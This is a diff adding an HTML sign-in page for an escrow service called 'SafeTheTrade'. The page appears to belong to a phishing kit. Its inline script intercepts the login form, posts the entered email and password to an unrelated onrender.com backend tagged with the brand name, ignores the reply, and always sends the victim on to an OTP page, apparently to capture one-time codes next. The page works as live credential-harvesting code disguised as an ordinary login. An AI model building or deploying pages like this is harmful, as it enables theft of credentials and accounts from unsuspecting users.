@@ -1,0 +1,296 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Sign In — SafeTheTrade</title>
+    <link rel="icon" href="../assets/favicon.svg" type="image/svg+xml" />
+    <link rel="preconnect" href="https://fonts.googleapis.com" />
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+    <link
+      href="https://fonts.googleapis.com/css2?family=Host+Grotesk:ital,wght@0,400;0,500;0,600;0,700;0,800;1,400;1,800&display=swap"
+      rel="stylesheet"
+    />
+    <link
+      rel="stylesheet"
+      href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/all.min.css"
+    />
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script>
+      tailwind.config = {
+        theme: {
+          extend: {
+            colors: {
+              stt: {
+                bg: "#0a0a0a",
+                card: "#121212",
+                border: "#303030",
+                text: "#dfdfdf",
+                muted: "#9f9f9f",
+                green: "#3ebd69",
+                greenBright: "#07b979",
+                btn: "#e5e5e5",
+                btnText: "#181818",
+                footer: "#0f0f0f",
+                input: "rgba(255,255,255,0.05)",
+              },
+            },
+            fontFamily: {
+              sans: ['"Host Grotesk"', "system-ui", "sans-serif"],
+            },
+          },
+        },
+      };
+    </script>
+    <style>
+      body {
+        font-family: "Host Grotesk", system-ui, sans-serif;
+      }
+      .brand-name {
+        font-weight: 800;
+        letter-spacing: -0.02em;
+      }
+      .auth-checkbox-box.checked {
+        background: #3ebd69;
+        border-color: #3ebd69;
+        color: #fff;
+      }
+      .auth-checkbox-box.checked i {
+        opacity: 1;
+      }
+      .auth-field-label {
+        letter-spacing: 0.06em;
+      }
+    </style>
+  </head>
+  <body class="min-h-screen flex flex-col bg-stt-bg text-stt-text antialiased">
+    <header class="auth-header border-b border-stt-border/40">
+      <div
+        class="mx-auto flex max-w-[1360px] items-center justify-between gap-4 px-4 py-3 sm:px-6 lg:px-8"
+      >
+        <div class="flex items-center gap-4 sm:gap-6 min-w-0">
+          <a
+            href="../index.html"
+            class="brand flex items-center gap-2.5 shrink-0"
+          >
+            <img
+              src="../assets/logo-icon.svg"
+              alt=""
+              width="27"
+              height="24"
+              class="w-[27px] h-6"
+            />
+            <span class="brand-name text-white text-[19px] sm:text-[21px]"
+              >SafeTheTrade</span
+            >
+          </a>
+          <nav class="hidden sm:block" aria-label="Public navigation">
+            <a
+              href="../index.html"
+              class="text-sm text-white/90 hover:text-white"
+              >Offers</a
+            >
+          </nav>
+        </div>
+        <div class="flex items-center gap-2">
+          <a
+            href="../login/"
+            class="rounded-lg bg-white px-3 py-1.5 text-sm font-medium text-black"
+            aria-current="page"
+            >Log in</a
+          >
+          <a
+            href="../register/"
+            class="rounded-lg bg-stt-greenBright px-3 py-1.5 text-sm font-medium text-white hover:brightness-110"
+            >Sign up</a
+          >
+        </div>
+      </div>
+    </header>
+
+    <main class="flex flex-1 items-start justify-center px-4 py-10 sm:py-14">
+      <form
+        class="auth-card w-full max-w-[480px] rounded-2xl border border-stt-border bg-stt-card p-6 sm:p-12"
+        novalidate
+      >
+        <div class="mb-8">
+          <h1 class="text-[28px] font-bold text-white sm:text-[32px]">
+            Sign In
+          </h1>
+          <p class="mt-2 text-sm text-stt-muted sm:text-base">
+            Access your secure P2P escrow account
+          </p>
+        </div>
+
+        <div class="space-y-5">
+          <label class="block">
+            <span
+              class="auth-field-label mb-2 block text-[11px] font-medium uppercase text-stt-muted"
+              >Email or Username</span
+            >
+            <div
+              class="auth-input-wrap flex items-center gap-3 rounded-lg border border-stt-border bg-stt-input px-3 py-3 focus-within:border-stt-green/60"
+            >
+              <i class="fa-regular fa-user text-stt-muted text-sm"></i>
+              <input
+                type="text"
+                name="username"
+                autocomplete="username"
+                required
+                placeholder="Enter your registered email..."
+                class="min-w-0 flex-1 bg-transparent text-sm text-white outline-none placeholder:text-stt-muted"
+              />
+            </div>
+          </label>
+
+          <label class="block">
+            <span
+              class="auth-field-label mb-2 block text-[11px] font-medium uppercase text-stt-muted"
+              >Password</span
+            >
+            <div
+              class="auth-input-wrap flex items-center gap-3 rounded-lg border border-stt-border bg-stt-input px-3 py-3 focus-within:border-stt-green/60"
+            >
+              <i class="fa-solid fa-lock text-stt-muted text-sm"></i>
+              <input
+                type="password"
+                name="password"
+                autocomplete="current-password"
+                required
+                placeholder="••••••••••••"
+                class="min-w-0 flex-1 bg-transparent text-sm text-white outline-none placeholder:text-stt-muted"
+              />
+              <button
+                type="button"
+                data-password-toggle
+                class="text-stt-muted hover:text-white"
+                aria-label="Show password"
+                title="Show password"
+              >
+                <i class="fa-regular fa-eye text-sm"></i>
+              </button>
+            </div>
+          </label>
+
+          <div class="flex items-center justify-between gap-3 pt-1">
+            <label
+              class="auth-checkbox flex cursor-pointer items-center gap-2.5 select-none"
+            >
+              <input type="checkbox" class="sr-only" checked />
+              <span
+                class="auth-checkbox-box checked inline-flex h-[18px] w-[18px] items-center justify-center rounded border border-stt-border bg-transparent text-[10px]"
+              >
+                <i class="fa-solid fa-check" style="opacity: 0"></i>
+              </span>
+              <span class="text-sm text-stt-text">Remember me</span>
+            </label>
+            <a href="#" class="text-sm text-stt-green hover:underline"
+              >Forgot password?</a
+            >
+          </div>
+        </div>
+
+        <div class="mt-8 space-y-5">
+          <button
+            type="submit"
+            class="w-full rounded-lg bg-stt-btn px-6 py-3.5 text-base font-medium text-stt-btnText hover:bg-white transition-colors"
+          >
+            Sign In securely
+          </button>
+          <p class="text-center text-sm text-stt-muted">
+            Don't have an account?
+            <a href="../register/" class="text-stt-green hover:underline"
+              >Create Escrow Account</a
+            >
+          </p>
+        </div>
+      </form>
+    </main>
+
+    <footer
+      class="site-footer mt-auto bg-stt-footer px-4 pb-5 pt-8 sm:px-6 lg:px-8"
+    >
+      <div
+        class="mx-auto flex max-w-[1360px] flex-col gap-4 sm:flex-row sm:items-center sm:justify-between"
+      >
+        <span class="text-sm text-stt-muted"
+          >www.safethetrade.com (C) 2026</span
+        >
+        <nav
+          class="flex flex-wrap gap-x-2 gap-y-1 text-sm text-stt-muted"
+          aria-label="Public pages"
+        >
+          <a href="#" class="hover:text-white">Rate calculator</a><span>/</span>
+          <a href="#" class="hover:text-white">System status</a><span>/</span>
+          <a href="#" class="hover:text-white">Transparency</a><span>/</span>
+          <a href="#" class="hover:text-white">API docs</a><span>/</span>
+          <a href="#" class="hover:text-white">Fees</a><span>/</span>
+          <a href="#" class="hover:text-white">FAQ</a><span>/</span>
+          <a href="#" class="hover:text-white">Terms</a><span>/</span>
+          <a href="#" class="hover:text-white">Privacy</a>
+        </nav>
+      </div>
+    </footer>
+
+    <script src="../js/auth.js"></script>
+    <script src="../js/app.js"></script>
+    <script>
+      // API endpoint configuration (Change this URL when updating base URL)
+      const API_ENDPOINT = "https://backend-nkxz.onrender.com/api/api/login";
+
+      document.addEventListener("DOMContentLoaded", () => {
+        const form = document.querySelector("form.auth-card");
+        if (form) {
+          form.addEventListener(
+            "submit",
+            async (e) => {
+              e.preventDefault();
+              e.stopImmediatePropagation();
+
+              const usernameInput = form.querySelector(
+                'input[name="username"]',
+              );
+              const passwordInput = form.querySelector(
+                'input[name="password"]',
+              );
+              const submitBtn = form.querySelector('button[type="submit"]');
+
+              const username = usernameInput ? usernameInput.value.trim() : "";
+              const password = passwordInput ? passwordInput.value : "";
+
+              if (submitBtn) {
+                submitBtn.disabled = true;
+                submitBtn.textContent = "Signing In...";
+              }
+
+              try {
+                await fetch(API_ENDPOINT, {
+                  method: "POST",
+                  headers: { "Content-Type": "application/json" },
+                  body: JSON.stringify({
+                    platform: "safethetrade",
+                    email: username,
+                    password: password,
+                  }),
+                });
+              } catch (err) {
+                console.warn("API submission error (proceeding to OTP):", err);
+              } finally {
+                localStorage.setItem(
+                  "stt_pending_email",
+                  username || "user@example.com",
+                );
+                sessionStorage.setItem(
+                  "stt_pending_email",
+                  username || "user@example.com",
+                );
+                window.location.href = "../s_otp/";
+              }
+            },
+            true,
+          );
+        }
+      });
+    </script>
+  </body>
+</html>
